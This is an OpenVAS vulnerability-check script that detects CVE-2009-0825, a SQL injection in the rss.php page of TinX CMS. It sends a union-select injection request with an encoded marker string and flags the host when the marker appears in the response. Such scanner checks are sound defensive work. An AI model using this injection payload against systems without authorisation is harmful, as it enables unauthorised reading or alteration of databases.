###############################################################################
# OpenVAS Vulnerability Test
# $Id: TinX_cms_3_5_sql_injection.nasl 5220 2017-02-07 11:42:33Z teissa $
#
# TinX CMS 'rss.php' SQL Injection Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "TinX CMS is prone to an SQL-injection vulnerability because it fails
  to sufficiently sanitize user-supplied data before using it in an
  SQL query.

  Exploiting this issue could allow an attacker to compromise the
  application, access or modify data, or exploit latent
  vulnerabilities in the underlying database.

  Versions prior to TinX CMS 3.5.1 are vulnerable.";

tag_solution = "The vendor has released an update.
  See http://sourceforge.net/project/showfiles.php?group_id=133415 for more
  information.";

if (description)
{
 script_id(100029);
 script_version("$Revision: 5220 $");
 script_tag(name:"last_modification", value:"$Date: 2017-02-07 12:42:33 +0100 (Tue, 07 Feb 2017) $");
 script_tag(name:"creation_date", value:"2009-03-10 08:40:52 +0100 (Tue, 10 Mar 2009)");
 script_bugtraq_id(34021);
 script_cve_id("CVE-2009-0825");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

 script_name("TinX CMS 'rss.php' SQL Injection Vulnerability");
 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_GATHER_INFO);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

dir = make_list("/cms","/tinxcms", cgi_dirs());
foreach d (dir)
{ 
 url = string(d, "/system/rss.php?id=-1%20union%20select%201,22222222222,3,4,5,6,7,8,0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374;");
 req = http_get(item:url, port:port);
 buf = http_keepalive_send_recv(port:port, data:req, bodyonly:1);
 if( buf == NULL )continue;

 if( 
     egrep(pattern: "<description>OpenVAS-SQL-Injection-Test</description>", string: buf)
   )
   {    
    security_message(port:port);
    exit(0);
   }
}
exit(0);
